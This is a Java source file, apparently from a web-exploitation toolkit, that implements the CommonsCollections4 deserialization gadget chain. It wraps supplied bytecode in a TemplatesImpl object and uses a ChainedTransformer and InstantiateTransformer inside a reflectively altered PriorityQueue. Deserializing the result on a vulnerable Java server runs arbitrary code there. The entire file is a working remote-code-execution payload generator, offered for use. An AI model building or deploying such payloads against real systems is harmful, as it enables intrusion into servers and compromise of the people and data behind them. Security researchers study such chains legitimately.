package com.reajason.javaweb.deserialize.payload.java;

import com.reajason.javaweb.deserialize.Payload;
import com.reajason.javaweb.deserialize.TemplateUtils;
import com.reajason.javaweb.deserialize.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import lombok.SneakyThrows;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.util.PriorityQueue;

/**
 * @author ReaJason
 * @since 2025/4/2
 */
public class CommonCollections4 implements Payload {

    @Override
    @SneakyThrows
    @SuppressWarnings({"rawtypes", "unchecked"})
    public Object generate(byte[] bytes) {
        TemplatesImpl templates = TemplateUtils.createTemplatesImpl(bytes);
        ChainedTransformer chain =
                new ChainedTransformer(
                        new ConstantTransformer(TrAXFilter.class),
                        new InstantiateTransformer(
                                new Class[]{Templates.class}, new Object[]{templates}));
        TransformingComparator comparator = new TransformingComparator(chain);
        PriorityQueue queue = new PriorityQueue(2, comparator);
        Reflections.setFieldValue(queue, "size", 2);
        Reflections.setFieldValue(queue, "comparator", comparator);
        return queue;
    }
}
